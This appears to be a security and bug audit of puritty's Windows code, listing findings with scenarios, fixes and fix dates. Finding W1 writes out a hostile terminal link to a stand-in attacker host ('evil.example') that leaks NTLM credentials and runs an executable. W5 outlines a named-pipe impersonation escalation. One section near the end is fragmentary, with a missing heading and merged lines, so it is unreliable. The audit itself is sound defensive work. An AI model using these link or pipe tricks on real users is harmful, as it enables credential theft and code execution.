### W1 · A `file:` link from a program's output is run by the shell: local executables and UNC paths
- Where: `app/src/Links.geng:20-21` (the allowlist), `packages/win32/src/Ext/puritty_win32.c:2935-2943` (`puritty_win32_openLink`), `app/windows/src/Open.geng:12-14`, `app/src/Main.geng:7239-7240`
- Kind: security
- Severity: high
- Confidence: confirmed (code path); ShellExecute's handling of `file:` is Windows' documented behaviour, not run here
- What: `Links.openable` lets through anything that starts `file:///` or `file://localhost/`, and Windows' `Open.link` hands the string to `ShellExecuteW(NULL, L"open", w, NULL, NULL, SW_SHOWNORMAL)`. On Linux `xdg-open` of a file opens its viewer; on Windows the "open" verb of an `.exe`, `.bat`, `.cmd`, `.js`, `.vbs`, `.hta`, `.msi`, `.lnk`, `.scr` *runs* it. The prefix test also passes `file:////host/share/x` and `file://///host/share/x`, which Windows reads as `\\host\share\x`. The C comment says "a URI the app has already found safe to open"; the app's test was written for xdg-open's meaning of open.
- Scenario: a remote host (or any program: `cat` of a file) prints `OSC 8 ; ; file:////evil.example/s/update.exe ST https://github.com/... OSC 8 ;; ST`. The user Ctrl+clicks what reads as a web link. Windows connects to the attacker's SMB server (sending the user's NTLM response, with no prompt at all) and offers or runs the executable; `file:///C:/Windows/System32/...` or a file the session just put on disk (an SFTP download, a browser's Downloads folder) runs with no network at all. CL9's reason for allowing `file:` ("a file only on this machine") does not hold: the host part is not the only way to name another machine.
- Fix: decide it per platform in `Open.link` (or give `Links` the platform): on Windows turn a `file:` URI into a path yourself, refuse anything that is not a plain drive path (UNC, `\\?\`, a percent-encoded backslash, 4+ slashes), and either refuse executable types (`AssocIsDangerous`, or `AssocQueryString` for the verb) or show the file selected in Explorer instead of opening it. Log the refusal as other refused links are.
- Fixed: 2026-11-21. The UNC and `//` forms and a host's tab's links are refused before `ShellExecuteW` (see MA2), and, by Gilbert's choice, a file link is shown first: its URI in the note bar at the first Ctrl+click, opened by a second within 6 s. An executable named by a local link still runs when the user clicks twice, having seen its path. Checked on Linux (Xvfb); on Windows the path is the same Geng code before `openLink`.

### W2 · Every code point no listed family covers opens every installed font face, inside the draw, under the paint lock
- Where: `packages/win32/src/Ext/puritty_win32.c:383-391` (`entry_covers`), `:393-397` (`try_family`), `:420-424` (`pt_fallback_file`'s last resort), `:249-254` (`scan_everything`), `:154-179` (`scan_file`); called from `packages/text/src/Ext/puritty_text.c:261` inside `pt_frame`, which `puritty_win32_draw` runs holding `paint` (`:1983-1990`)
- Kind: speed (and security: a remote program can do it on purpose)
- Severity: medium
- Confidence: confirmed (the work); the time is an estimate
- What: `entry_covers` does `FT_New_Face` … `FT_Get_Char_Index` … `FT_Done_Face` each time it is asked, so nothing about a face's coverage is kept. A fallback query tries up to ~25 listed families (a face opened and closed for each that exists), and when none covers the cluster it calls `scan_everything` (first time: every font file in the registry opened once per face *and* once per named instance, `scan_file`) and then `entry_covers` over **all** `entries`. The text layer caches the answer per first code point (4,096 slots), so the cost is per distinct code point, not per cell, but a miss costs N face opens where N is every face on the machine (several hundred on a stock Windows 11; more with Office or CJK packs).
- Scenario: a program prints text with many distinct code points Windows has no font for (a Unicode chart, private-use ranges, `cat` of a binary read as UTF-8, or a hostile host doing it deliberately: 6,400 PUA code points alone). Each new one opens every font file. The Geng loop is inside `draw` the whole time, and the window thread blocks in `WM_PAINT` on the same lock (`paint_window`, `:1406`), so the window stops answering input and Windows marks it "Not responding". `puritty_win32_fonts` (the settings window's list, `:465-479`) pays the first `scan_everything` on the Geng thread too.
- Fix: keep per-entry coverage once computed (the face's charmap as a bitset or sorted ranges, filled the first time the entry is asked), or keep the `FT_Face` open per entry; then a miss is N lookups, not N file opens. Cache a negative answer for a whole block. Consider doing `scan_everything` once off the draw path.
- Fixed: 2026-11-24, `docs/windows.md` WS32. Each font entry keeps its code points as sorted ranges read once from its charmap; a question is a binary search. Measured on beelink1 (544 font files), 500 code points no font has: 32,461 ms of fallback questions before, 264 ms now; the same faces chosen for 26 scripts. Not done: the first `scan_everything` is still on the draw's thread.

### W3 · A capture taken from the window forgets the held buttons without telling the program; the native menu does this every time
- Where: `packages/win32/src/Ext/puritty_win32.c:1537-1539` (`WM_CAPTURECHANGED`), `:1232-1241` (`button`), `:1583-1598` (`WM_APP_MENU`, `TrackPopupMenu`); `app/src/Main.geng:3583` (`isMenuClick`: a *press*), `:7519-7532` (`held`), `:6927` (`m.held == 0` gates hover)
- Kind: bug
- Severity: medium
- Confidence: plausible (Windows' delivery of the button-up not run; whether the menu click itself reaches the `held` update at `:7523` not traced to the end)
- What: `case WM_CAPTURECHANGED: if ((HWND) lp != h) buttons_held = 0;` clears the C side's buttons and records nothing. X11's implicit grab always delivers the release; here it is lost whenever something else takes the capture while a button is down. The native pop-up is opened by Ctrl + right button **down** (`p.action == 0 && p.button == 2`), the request goes to the Geng thread and back as `WM_APP_MENU`, and `TrackPopupMenu` takes the capture while the button is normally still down: the `WM_RBUTTONUP` goes to the menu's loop, never to `proc`.
- Scenario: Ctrl+right-click, pick an item or press Esc. The program has seen a press of button 2 and no release. If that press is in `m.held`, the bit stays set until the next right-button release: motion with no button down is treated as a drag (`m.held == 0` fails at `:6927`: no hover pointer shapes, and in mouse modes 1002/1003 the program is sent drag reports). The same loss happens on Alt+Tab or a UAC prompt in the middle of a selection drag.
- Fix: on `WM_CAPTURECHANGED` (to another window) record a release (action 1) at `last_x`, `last_y` for each bit of `buttons_held` before clearing it. Separately, open the menu on the button's release, as Windows' own context menus do (see the next finding).
- Fixed: 2026-11-24, `docs/settings.md` ST40. On Windows the Ctrl+right menu opens on the release; a capture taken by another window tells a release of each held button. Measured on beelink1: before, `buttons held 2` after a menu over a held left button; now 0.

### W4 · The pop-up menu opens up and left of the pointer by the padding, so the pointer starts over its first item
- Where: `app/src/Main.geng:3733` (`Window.menu { x = p.x, y = p.y, ... }`), `packages/win32/src/Ext/puritty_win32.c:1220-1222` (pointer positions are from the cells' corner), `:2443` and `:1590-1593` (`ClientToScreen` of the same numbers)
- Kind: bug
- Severity: medium
- Confidence: confirmed (the offset); plausible (that the release then chooses the item)
- What: since R20/R21 `pointer_record` reports `x - ox`, `y - oy`. `Window.menu` passes those numbers back, and `WM_APP_MENU` treats them as client coordinates: `POINT at = {x, y}; ClientToScreen(h, &at); TrackPopupMenu(... at.x, at.y ...)`. The menu's corner is therefore `(ox, oy)` up-left of the pointer: 11 px and 5 px or more at 96 dpi with the default padding of 8 (more at 144 dpi, plus half the spare pixels). ST26 was built a week before R20 and was not revisited.
- Scenario: Ctrl+right-press. The menu appears with the pointer already inside it, over "Settings…". It is shown while the right button is still down, with `TPM_RIGHTBUTTON`, so letting the button go over an item can choose it, as a press-drag-release in any Windows menu does: a plain Ctrl+right-click may start the first item.
- Fix: add `ox`, `oy` back in `WM_APP_MENU` (read under `queue_lock`), or simply open the menu at `GetCursorPos`. Open it on the release.
- Fixed: 2026-11-24, `docs/settings.md` ST40. The menu opens at `GetCursorPos`. Measured on beelink1 (`drive.exe menuat`): before, the menu 16 and 8 px up and left of the pointer; now at it.

### W5 · The ssh agents' named pipes are opened as ordinary files: the server may impersonate the user, and its owner is not checked
- Where: `app/windows/src/SshAgents.geng:53-54`, `packages/ssh/src/Ssh/Session.geng:577-578` (`File.open ... (Path.fromString pipePath)`), `/home/gram/prj/geng-lang/packages/os/src/Ext/windows/geng_os_file.c:134-136` (`CreateFileW(path, access, share_all, NULL, disposition, flags | FILE_ATTRIBUTE_NORMAL, NULL)`)
- Kind: security
- Severity: medium
- Confidence: confirmed (the flags); the attack is the well-known one, not tried
- What: the client end of `\\.\pipe\openssh-ssh-agent` and Pageant's pipe is opened with no `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, so the default applies: the pipe's server may impersonate puritty's user (`ImpersonateNamedPipeClient`). Nor is the pipe's owner compared with the current user. PuTTY does both for exactly these pipes (its named-pipe client refuses a pipe "owned by someone else" and opens with `SECURITY_IDENTIFICATION`). `openssh-ssh-agent` is a fixed name, and Windows' agent service is disabled by default, so the name is usually free for any local process to create.
- Scenario: a process in another account that holds `SeImpersonatePrivilege` (any service account, IIS, SQL Server) creates `\\.\pipe\openssh-ssh-agent` and waits. The next time the built-in client authenticates, it connects, and the service gets the interactive user's token: a local escalation of privilege. A fake agent also sees every sign request and chooses which identities are offered.
- Fix: open agent pipes through a call of puritty's own (in `packages/win32`, beside `pageantParts`) or an option of `Os.File.open` that sets `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, then `GetSecurityInfo(SE_KERNEL_OBJECT, OWNER_SECURITY_INFORMATION)` and refuse a pipe whose owner is not the user's SID (or SYSTEM/Administrators for the OpenSSH service). The generic open's default is the os package's; say so there in one line.

### W6 · A font is found by its registry name, which on a localized Windows is not the family name FreeType reads
- Where: `packages/win32/src/Ext/puritty_win32.c:226-247` (`scan_family`), `:327-336` (`exact_face` compares FreeType's `family_name`), `:364-369` (`windows_fallback`)
- Kind: bug
- Severity: medium
- Confidence: plausible (needs a Korean, Japanese or Chinese display-language Windows to confirm how `HKLM\...\Fonts` names its fonts there)
- What: a family's files are found by a case-insensitive prefix match of the family against the parts of the registry value's *name* ("Malgun Gothic (TrueType)"), and only files found that way are scanned into `entries`. Windows writes those names in the system's language for the fonts that have localized names (`ＭＳ ゴシック & MS UI Gothic & ＭＳ Ｐゴシック (TrueType)`, `맑은 고딕 (TrueType)`, `굴림 & 굴림체 & ...`), while FreeType's `family_name` is the English one. So `find_face("Malgun Gothic")`, `"MS Gothic"`, `"Microsoft YaHei"` find no file on those systems.
- Scenario: on a Korean Windows the first Hangul cluster tries `ko:Malgun Gothic`, finds nothing, falls through every listed family, runs `scan_everything` (the slow path of the finding above) and takes the first entry in registry order that covers it (Batang or Gulim, whichever comes first). After that scan `entries` holds Malgun Gothic by its English name, so the *next* Hangul code point gets Malgun Gothic: two fonts mixed on one line, chosen by which syllable came first. A user who types the localized name as their font gets "no font". These are the users WS21's language fallback was written for.
- Fix: do not key on the registry's display name. Either scan every registered file's name table once (cheap if only `FT_New_Face(-1)` plus the family names, cached on disk by path and mtime) or match against all of a face's family names (`FT_Get_Sfnt_Name`, name ids 1 and 16 in every language) and fall back to a full scan before giving up on a named family.

### W7 · `refit` changes the text layer and the window's size state outside the locks the window thread uses for them
- Where: `packages/win32/src/Ext/puritty_win32.c:2136-2146` (`refit`, on the Geng thread), `:1367-1387` (`size_in`), `:1444-1481` (`rescale`, on the window thread), `packages/text/src/Ext/puritty_text.c:990-996` (`pt_resize`)
- Kind: bug
- Severity: low
- Confidence: plausible (a race; narrow)
- What: `win_cols`, `win_rows` are written by both threads with no lock (`refit` sets `win_cols = -1`; `size_in` compares and sets them after it has left `queue_lock`). `refit` reads `win_w`, `win_h` under the lock, leaves it, and `size_in(w, h)` writes them back, so a `WM_SIZE` that lands in between is overwritten with the old size. `refit` calls `pt_resize` without `paint`: `pt_target` takes it for the swap, but `pt_resize`'s `fill` then writes `pixels` unlocked, while `rescale` on the window thread may run `pt_zoom`/`pt_resize` (which frees and replaces `pixels`) under `paint`.
- Scenario: the user zooms (or a settings reload changes the font or padding) at the moment the window is snapped, maximized or dragged across monitors. Outcomes: `win_w`/`win_h` hold the size before the snap, so the program is told the old cols and rows and stays at them until the next resize; or `fill` writes into a bitmap `rescale` has just freed.
- Fix: one rule for this state: `win_cols`, `win_rows`, `win_w`, `win_h` only under `queue_lock`, with `size_in` taking the size as an argument only from `WM_SIZE` and `refit` re-deriving from the stored size inside the lock; and `refit`'s `size_in` + `pt_resize` inside `paint`, as `rescale`'s are (`:1475-1479`).

### W8 · The event queue is 64 KB and a record that does not fit is dropped with no trace, a resize, a close or a release included
- Where: `packages/win32/src/Ext/puritty_win32.c:730`, `:803-815` (`record_as`); `:1679-1692` (`drag_record`, not merged as motions are)
- Kind: bug
- Severity: low
- Confidence: confirmed (the drop); reaching it needs the Geng loop stalled for a long time
- What: `else if (evlen + n <= (int) sizeof evbuf) { ... }` and otherwise nothing. `size_in` has already set `win_cols`, `win_rows` when its record is dropped, so the same size is never reported again. Unlike X11's queue (same size, same drop) this one is filled by another thread while the Geng loop is busy: in a long draw (the font scan above), in `MessageBoxW` (`:2475`), in a clipboard read waiting on another program's delayed rendering. `DragOver` records (13 bytes, one for every OLE `DragOver` call, which repeats while the pointer rests) are each queued and each wake the loop.
- Scenario: the loop stalls while the user keeps dragging a file over the window or types; past 64 KB a `Resized` is lost and the terminal keeps the wrong size, or a key or button release is lost and the key repeats in the program.
- Fix: let the buffer grow (it is malloc'd bytes under a lock); merge a `DragOver` into a preceding one as motion is merged; if a cap stays, count drops and, for a dropped size, clear `win_cols` so the next `WM_SIZE` reports again.
- Fixed: 2026-11-27, `docs/windows.md` WS35. The queue grows (as X20); a drag's motion merges with the one before it. Not tested yet (the events gate needs beelink1's desktop).

### W9 · After Explorer restarts, no notification is ever shown again
- Where: `packages/win32/src/Ext/puritty_win32.c:2918-2925`
- Kind: bug
- Severity: low
- Confidence: confirmed by reading (Explorer drops every tray icon when it restarts)
- What: `notify_icon` is set once after `NIM_ADD`; every later call is `NIM_MODIFY`. When Explorer restarts (a crash, an update, a sign-out of the shell) the icon is gone, `NIM_MODIFY` fails, and `notify` answers 0 for the rest of the process: "the notification area refused it".

### W10 · A second `puritty settings` is satisfied by any puritty window whose title is the settings window's
- Where: `packages/win32/src/Ext/puritty_win32.c:2218-2230` (`FindWindowW(L"puritty", w)`), `app/src/SettingsProgram.geng:131`
- Kind: security
- Severity: low
- Confidence: confirmed (code); X11's `puritty_x11_raise` matches by `_NET_WM_NAME` the same way
- What: every puritty window has the class `puritty`, and a terminal's title is whatever the program in it sets (OSC 0/2). `raise` brings forward the first window with that exact title and the new process ends.

### W11 · Clipboard failures are silent, and a failed allocation in a large paste is dereferenced
- Where: `packages/win32/src/Ext/puritty_win32.c:2288-2294` (`open_clipboard`), `:2296-2322` (`own_clipboard`), `:2325-2342` (`read_clipboard`), `:2345-2357`
- Kind: bug
- Severity: low
- Confidence: confirmed

### W12 · An image paste takes the PNG's allocation size, not its length, and initializes COM once per paste
- Where: `packages/win32/src/Ext/puritty_win32.c:3012-3015`, `:3017`
- Kind: bug
- Severity: low
- Confidence: confirmed (`GlobalSize` may exceed what was asked for); effect on receivers plausible
- What: `take_bytes(d, GlobalSize(h))`: `GlobalSize` is the block's size, which the allocator may round up, so bytes past the PNG's `IEND` can be sent as part of the file (uploaded over SFTP, FT13). `CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)` is called on each bitmap paste with no `CoUninitialize` and its result unused (`puritty_win32_jump_list` pairs its own, `:2527`, `:2579`).
- Scenario: a screenshot pasted from Snipping Tool arrives a few bytes longer than the PNG; a strict reader, or a checksum of the file, differs.
- Fix: walk the PNG's chunks to `IEND` (or trust the size only up to it); initialize COM once for the thread, or pair it.
- Fixed: 2026-11-27, `docs/windows.md` WS34. `png_length` (`puritty_png.h`) takes the PNG through IEND; COM init paired. `packages/win32/tests/cases.sh`: a 97-byte PNG in a 129-byte block was 129, now 97.

### W13 · A registry font path is read past its end when the value is not NUL-terminated
- Where: `packages/win32/src/Ext/puritty_win32.c:205-215`
- Kind: bug
- Severity: low
- Confidence: confirmed
- What: `RegEnumValueW` does not promise a terminator for `REG_SZ`. - Fixed: 2026-11-27, `docs/windows.md` WS34. The value ends at `dn / sizeof(wchar_t)`, bounded; a failed `GetWindowsDirectoryW` falls back to `C:\\Windows`. Not tested: nothing drives the registry.

- Confidence: confirmed
- What: after `signtool verify /pa` on the signing host, the only check made on the file that comes back is that it is longer than the one sent; it then replaces the original. ## Looked at and found sound

- **Bitmap target** (`pt_fill`, `pt_scroll`, `pt_glyphs_draw`, `pt_picture_draw*`): every write is clipped to `pw`×`ph`; `pt_scroll`'s `memmove` bounds hold for negative and overlong ranges; glyph table rehash and `find_kept` are right; no GDI object is created per glyph or per cell. `paint_window` makes one brush per `WM_PAINT` and deletes it, pairs `BeginPaint`/`EndPaint`, and blits only through the update region. Rows invalidated per frame, not the window.
- **Lock order**: `paint` then `queue_lock` is the only nesting (`rescale` → `size_in`); nothing takes them the other way round. The Geng thread holds no lock across `SetWindowPos`, `SetWindowTextW`, `ShowWindowAsync` or `MessageBoxW`, so the cross-thread sends cannot deadlock against `WM_PAINT`.
- **Wake-up**: `record_as` posts only when the queue was empty; `puritty_win32_events` checks then parks, and a record queued in between is caught by `ready` running later on the Geng thread; `take` resets `last_motion`. The holder is old-allocated and written with the barrier.
- **Keys**: scan code → X keycode table is 512 entries and indexed within it; `keys_held` is 256 bits; `made[16]`, `lv/un/other[8]`, `text[64]` cannot overflow (`utf8_of` stops at whole code points, and 16 UTF-16 units are at most 48 bytes); `ToUnicodeEx` is always called with flag 4 so a waiting dead key is not eaten; the AltGr left-Ctrl is recognised by time and extended bit and its release is swallowed with it; `VK_PACKET` pairs surrogates across messages; `VK_PROCESSKEY` goes to the IME; Alt+F4 and Alt+Space reach Windows and nothing else opens the menu bar. `sym_text` matches xkbcommon's `xkb_keysym_to_utf32` special cases exactly.
- **IME**: the composition window is hidden by clearing `ISC_SHOWUICOMPOSITIONWINDOW` and not passing `WM_IME_STARTCOMPOSITION`/`COMPOSITION` on; a message with both result and composition records commit then preedit; `ImmGetContext`/`ImmReleaseContext` are paired on every path; buffer sizes in `record_preedit` and `ime_composition` hold (4,000 + 1,000 + header against the static buffers).
- **Per-monitor DPI**: `rescale` runs on the window thread under `paint`, keeps the cell count, uses `AdjustWindowRectExForDpi`, handles the maximized case, and is a no-op under `PURITTY_DPI`. `WM_SIZE` when minimized is ignored (WS31).
- **Pointer**: `SetCapture` on the first button and release on the last; wheel deltas summed and reset on a turn; screen → client for wheel and drag positions; motion merged in the queue.
- **Drag and drop**: `IDropTarget` vtable order and `QueryInterface` are right; `GlobalLock`/`GlobalUnlock`/`ReleaseStgMedium` paired; `OleInitialize`/`RevokeDragDrop`/`OleUninitialize` on the window's thread; the list is handed over under `queue_lock`.
- **Clipboard pairing**: every `OpenClipboard` that succeeds reaches `CloseClipboard` on every path; the `HGLOBAL` is freed when `SetClipboardData` refuses it and not otherwise; `WM_CLIPBOARDUPDATE` after our own copy is told apart by `GetClipboardOwner`.
- **COM in the jump list and the PNG encoder**: every interface obtained is released on every path, `AbortList` on failure; `IShellLink` arguments come from `Recent.commandLine`, whose quoting (backslashes doubled before a quote and before the closing quote) is the C runtime's.
- **Registry reads for PuTTY sessions, the language and the code page**: types checked (`RRF_RT_*`, `REG_SZ`/`REG_DWORD` with its size), lengths taken from the API and terminated at them, a value that grew between the two calls is skipped, `RegCloseKey` on every path. The `%XX` unescape's bounds are right.
- **Pageant's pipe name**: matches PuTTY's `capi_obfuscate_string` (the 16-byte block, the SSH `string` framing hashed, lower-case hex) and `agent_named_pipe_name`.
- **Credentials**: `CredReadW`/`CredFree` paired, generic type, the blob's size taken from the structure; an over-long secret or an ssh logon comes back as Windows' error number, not a bare failure.
- **Default shell names** (`Platform.programs`): bare names are resolved by the os package's own search (child's `PATH`, system directories), not `CreateProcess`'s, so a `pwsh.exe` in the current directory is not run.
- **`Window.geng`'s `decode`**: every read is bounded by `rest`, `advance` cannot go back or past the end, record lengths match what the C writes for all seventeen kinds.
- **`Platform.languageOf`**, `Notify`, `Open`, `PuttyStore`, `SecretStore`: thin and right.
- **Build scripts**: `build-windows.sh` and `build-text-libs.sh` use `set -e`/`pipefail`, static libraries, no network fetch outside nix's pinned sources. The Linux-trained profile for the Windows build is WS29's decision.
- Left as designed: `WM_QUERYENDSESSION` is the system's (`docs/tabs.md`), the changed-key box blocks the loop (SC28), `CRED_PERSIST_LOCAL_MACHINE` (PW7), X11-identical pixels by software compositing (V52).
